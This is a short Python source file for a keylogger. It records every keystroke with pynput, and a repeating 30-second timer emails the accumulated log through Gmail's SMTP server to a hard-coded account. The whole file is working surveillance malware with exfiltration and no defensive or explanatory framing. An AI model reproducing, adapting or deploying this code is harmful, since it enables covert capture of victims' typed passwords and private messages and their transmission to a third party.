import pynput.keyboard
import smtplib
import threading
import optparse
log = ""

def callbackFunction(key):
    global log
    try:
        log = log+ str(key.char)
    except AttributeError:
        if key == key.space:
            log=log + " "
        elif key == key.enter:
            log=log + "\n"
        else:
            log = log + str(key)
    except:
        pass

    print(log)

def sendEmail(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

keyloggerListener= pynput.keyboard.Listener(on_press=callbackFunction)

def threadFunction():
    global log
    sendEmail("user@gmail.com", "user's gmail password",log.encode('utf-8'))
    log=""
    timer_object = threading.Timer(30,threadFunction)
    timer_object.start()

#Threading
with keyloggerListener:
    threadFunction()
    keyloggerListener.join()

